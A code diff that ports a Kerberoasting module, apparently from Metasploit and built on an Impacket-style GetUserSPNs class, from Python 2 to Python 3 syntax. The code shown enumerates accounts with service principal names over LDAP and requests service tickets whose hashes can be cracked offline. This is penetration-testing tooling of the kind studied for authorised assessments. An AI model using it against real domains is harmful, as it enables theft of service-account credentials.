@@ -112,7 +112,7 @@ class GetUserSPNs:
             s.login('', '')
         except Exception:
             if s.getServerName() == '':
-                raise('Error while anonymous logging into %s' % self.__domain)
+                raise Exception('Error while anonymous logging into %s' % self.__domain)
         else:
             s.logoff()
         return s.getServerName()
@@ -151,7 +151,7 @@ class GetUserSPNs:
                                                             compute_lmhash(password),
                                                             compute_nthash(password), self.__aesKey,
                                                             kdcHost=self.__kdcHost)
-        except Exception, e:
+        except Exception as e:
             module.log('Exception for getKerberosTGT', level='error')
             tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                 unhexlify(self.__lmhash),
@@ -213,7 +213,7 @@ class GetUserSPNs:
         try:
             ldapConnection = ldap.LDAPConnection('ldap://%s'%self.__target, self.baseDN, self.__kdcHost)
             ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
-        except ldap.LDAPSessionError, e:
+        except ldap.LDAPSessionError as e:
             if str(e).find('strongerAuthRequired') >= 0:
                 # We need to try SSL
                 ldapConnection = ldap.LDAPConnection('ldaps://%s' % self.__target, self.baseDN, self.__kdcHost)
@@ -230,7 +230,7 @@ class GetUserSPNs:
                                          attributes=['servicePrincipalName', 'sAMAccountName',
                                                      'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                          sizeLimit=999)
-        except ldap.LDAPSearchError, e:
+        except ldap.LDAPSearchError as e:
             if e.getErrorString().find('sizeLimitExceeded') >= 0:
                 module.log('sizeLimitExceeded exception caught, giving up and processing the data received', level='debug')
                 # We reached the sizeLimit, process the answers we have already and that's it. Until we implement
@@ -282,8 +282,8 @@ class GetUserSPNs:
                         module.log('Bypassing disabled account {}'.format(sAMAccountName), level='debug')
                     else:
                         for spn in SPNs:
-                            answers.append([spn, sAMAccountName,memberOf, pwdLastSet, lastLogon])
-            except Exception, e:
+                            answers.append([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon])
+            except Exception as e:
                 module.log('Skipping item, cannot process due to error', level='error')
 
         if len(answers)>0:
@@ -295,7 +295,7 @@ class GetUserSPNs:
 
                 # Get a TGT for the current user
                 TGT = self.getTGT()
-                for user, SPN in users.iteritems():
+                for user, SPN in users.items():
                     try:
                         serverName = Principal(SPN, type=constants.PrincipalNameType.NT_SRV_INST.value)
                         tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, self.__domain,
@@ -303,7 +303,7 @@ class GetUserSPNs:
                                                                                 TGT['KDC_REP'], TGT['cipher'],
                                                                                 TGT['sessionKey'])
                         self.outputTGS(tgs, oldSessionKey, sessionKey, user, SPN)
-                    except Exception , e:
+                    except Exception as e:
                         module.log('SPN Exception: {} - {}'.format(SPN, str(e)), level='error')
 
         else:
